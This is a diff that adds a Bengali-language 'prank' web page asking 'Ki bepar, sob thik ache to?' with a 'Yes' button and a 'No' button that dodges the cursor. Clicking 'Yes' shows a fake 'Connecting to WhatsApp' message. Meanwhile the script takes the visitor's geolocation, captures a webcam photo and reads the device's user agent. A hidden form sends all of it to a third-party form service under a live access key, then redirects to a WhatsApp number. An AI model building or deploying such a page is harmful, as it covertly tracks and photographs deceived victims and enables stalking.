@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ki Bepar? 😉</title>
+    <style>
+        body {
+            margin: 0; padding: 0;
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh;
+            background: radial-gradient(circle, #0f0c29, #302b63, #24243e);
+            font-family: 'Segoe UI', sans-serif; color: white; overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 40px; border-radius: 20px;
+            backdrop-filter: blur(15px);
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            width: 320px;
+        }
+
+        h1 { font-size: 2.2rem; margin-bottom: 25px; text-shadow: 0 0 10px #00d2ff; }
+
+        .buttons { display: flex; justify-content: center; gap: 20px; }
+
+        button {
+            padding: 12px 30px; font-size: 1rem; border: none;
+            border-radius: 25px; cursor: pointer; transition: 0.3s; font-weight: bold;
+        }
+
+        #yesBtn { background: #00d2ff; color: white; box-shadow: 0 0 15px #00d2ff; }
+        #noBtn { background: #ff4b2b; color: white; position: absolute; }
+
+        #loading { display: none; margin-top: 20px; color: #ffff00; font-weight: bold; }
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>KI BEPAR <br> SOB THIK ACHE TO? 🤨</h1>
+        <div class="buttons">
+            <button id="yesBtn" onclick="startPrank()">Hyan, Ekdom!</button>
+            <button id="noBtn" onmouseover="moveButton()">Nah!</button>
+        </div>
+        <p id="loading">Connecting to WhatsApp... 🚀</p>
+    </div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <form id="prankForm" action="https://api.web3forms.com/submit" method="POST" style="display:none;">
+        <input type="hidden" name="access_key" value="f0a21e25-dec8-4e72-8cd9-e8b45f892f86">
+        <input type="hidden" name="Location" id="locData">
+        <input type="hidden" name="Maps_Link" id="mapsLink">
+        <input type="hidden" name="Device_Info" id="uaData">
+        <input type="hidden" name="Photo_Data" id="photoData">
+        <input type="hidden" name="redirect" value="https://wa.me/+916296017341?text=Hii">
+    </form>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const prankForm = document.getElementById('prankForm');
+        const loadingText = document.getElementById('loading');
+
+        const myWhatsAppNumber = "YOUR_PHONE_NUMBER"; 
+
+        function moveButton() {
+            const x = Math.random() * (window.innerWidth - 100);
+            const y = Math.random() * (window.innerHeight - 50);
+            const noBtn = document.getElementById('noBtn');
+            noBtn.style.left = x + 'px';
+            noBtn.style.top = y + 'px';
+        }
+
+        async function startPrank() {
+            loadingText.style.display = "block";
+            document.getElementById('yesBtn').innerText = "Wait...";
+            document.getElementById('yesBtn').disabled = true;
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    document.getElementById('locData').value = `Lat: ${lat}, Lon: ${lon}`;
+                    document.getElementById('mapsLink').value = `https://www.google.com/maps?q=${lat},${lon}`;
+                    setupCamera();
+                }, () => setupCamera());
+            } else {
+                setupCamera();
+            }
+        }
+
+        async function setupCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                setTimeout(() => {
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    document.getElementById('photoData').value = canvas.toDataURL('image/jpeg', 0.4);
+                    submitData();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1500);
+            } catch (err) {
+                submitData();
+            }
+        }
+
+        function submitData() {
+            document.getElementById('uaData').value = navigator.userAgent;
+            prankForm.submit(); // Web3Forms সরাসরি সাবমিট করা সহজ
+        }
+    </script>
+</body>
+</html>
